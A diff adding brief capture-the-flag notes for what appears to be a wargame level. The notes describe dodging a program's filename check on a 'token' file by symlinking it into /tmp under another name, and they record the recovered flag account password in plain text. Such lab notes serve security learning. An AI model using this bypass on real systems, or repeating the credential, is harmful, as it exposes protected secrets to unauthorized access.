@@ -1,0 +1,14 @@
+objdump -d to see what is happening in the main
+ltrace with different args 
+
+if (strstr(argv[1], "token"))
+	printf("no access to token)
+
+create symbolic link to token with different name
+
+ln -s `readlink -f token` /tmp/exploit
+
+got password flag08: quif5eloekouj29ke0vouxean
+
+
+
